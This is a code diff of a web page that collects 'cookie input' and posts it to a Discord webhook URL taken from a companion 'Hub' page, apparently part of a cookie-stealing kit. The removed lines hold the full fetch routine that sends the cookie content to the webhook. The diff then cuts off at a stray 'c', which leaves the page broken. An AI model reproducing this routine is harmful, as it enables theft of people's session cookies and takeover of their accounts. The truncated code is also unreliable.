@@ -67,7 +67,7 @@
 
     if (!webhookURL) {
       alert('Please provide a webhook URL first on the Hub page!');
-      window.location.href = 'index.html';  // Redirect to Hub page
+      window.location.href = 'index.html';  // Redirect to Hub page if no webhook URL is found
     }
 
     console.log('Webhook URL extracted:', webhookURL);  // Debugging: Check if webhook URL is correctly extracted
@@ -106,26 +106,4 @@
 
     // Function to send data to Discord via webhook
     function sendToDiscord(cookieContent) {
-      const message = {
-        content: `New Cookie Input received!\nCookie Content:\n${cookieContent}`,
-      };
-
-      // Send the POST request to Discord webhook
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(message),
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Message sent to Discord:', data);
-      })
-      .catch(error => {
-        console.error('Error sending message to Discord:', error);
-      });
-    }
-  </script>
-</body>
-</html>
+      c
